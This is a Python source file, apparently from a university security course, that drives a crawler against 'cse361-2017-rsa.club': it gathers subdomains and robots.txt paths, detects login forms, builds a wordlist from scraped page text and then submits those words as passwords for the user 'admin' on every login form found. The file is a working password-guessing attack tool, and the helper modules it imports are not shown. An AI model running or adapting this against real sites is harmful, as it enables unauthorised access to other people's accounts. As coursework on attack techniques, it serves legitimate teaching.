import url_list, html_processer, html_parser, dataset, subdomain

class CrawlerMain(object):
    def __init__(self):
        self.url_list = url_list.UrlList()
        self.processer = html_processer.HtmlProcesser()
        self.parser = html_parser.HtmlParser()
        self.dataSet = dataset.DataSet()

    def crawl(self, root_url, includeSubDomain, includeRobots, user_agent, max_pages):
        count = 1
        self.url_list.add_one_url(root_url)
        if includeSubDomain:
            print("Checking all subdomains ...")
            subdomain_list = subdomain.get_subdomain(root_url)
            self.url_list.add_new_url_list(subdomain_list)
        if includeRobots:
            print("Checking robots.txt ...")
            if subdomain.checkRobots(root_url):
                print("robots.txt found, loading ...")
                robot_list = subdomain.getRobotsLists(root_url)
                self.url_list.add_new_url_list(robot_list)
            else:
                print("robots.txt not found.\n")

        #print(self.url_list.unprocessed_urls)
        while self.url_list.has_new_url():
            try:
                new_url = self.url_list.get_one_url()
                print("Crawling %d : %s" % (count, new_url))
                html_content = self.processer.download(new_url)
                #print(self.parser.checkLoginForm(html_content))
                if self.parser.checkLoginForm(html_content):
                    #print(self.parser.getLoginFormDataName(html_content))
                    self.url_list.add_one_login_url(new_url,self.parser.getLoginFormDataName(html_content))

                new_url_list, new_data = self.parser.parse(new_url, html_content)

                self.url_list.add_new_url_list(new_url_list)
                self.dataSet.collect_data(new_data)

                if(count == max_pages):
                    break
                count = count + 1
            except:
                print("Crawl failed")
        while self.url_list.has_login_url():
            login_url = self.url_list.get_one_login_url()
            login_vars = self.url_list.get_one_login_vars()
            print("Testing password on "+login_url+" ...")
            result = self.processer.upload(user_agent,login_url,login_vars,self.dataSet.get_data())
            if result :
                print("URL: "+login_url)
                print("It works !  :^) ")
            else:
                print("URL: "+login_url)
                print("No password found ! :^( ")
        #self.dataSet.print_data()

if __name__=="__main__":
    root_url = "http://cse361-2017-rsa.club"
    crawler = CrawlerMain()
    user_agent = "admin"
    crawler.crawl(root_url,False,True,user_agent,100)
